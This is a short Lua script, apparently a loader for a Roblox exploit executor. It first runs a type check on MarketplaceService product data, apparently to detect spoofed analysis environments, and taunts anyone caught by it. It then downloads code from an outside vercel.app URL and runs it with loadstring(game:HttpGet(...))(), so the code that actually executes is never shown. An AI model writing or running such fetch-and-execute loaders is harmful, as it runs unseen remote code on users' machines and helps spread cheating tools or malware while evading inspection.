local game_data = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)

local expected = {
    Name = "string",
    Description = "string",
    Creator = "table",
    CreatorType = "string",
    CreatorId = "number",
    AssetId = "number",
    IsForSale = "boolean",
    ProductType = "string",
    PriceInRobux = "number",
    Updated = "string",
    Created = "string",
    IconImageAssetId = "number",
    IsPublicDomain = "boolean",
    Sales = "number",
    Remaining = "number",
}

for key, expectedType in pairs(expected) do
    if game_data[key] ~= nil then
        if type(game_data[key]) ~= expectedType then
            return warn("yh, fuck u skid")
        end
    end
end

loadstring(game:HttpGet("https://luarot.vercel.app/api-load/4c1ac2310591ecffd7fd902f"))()
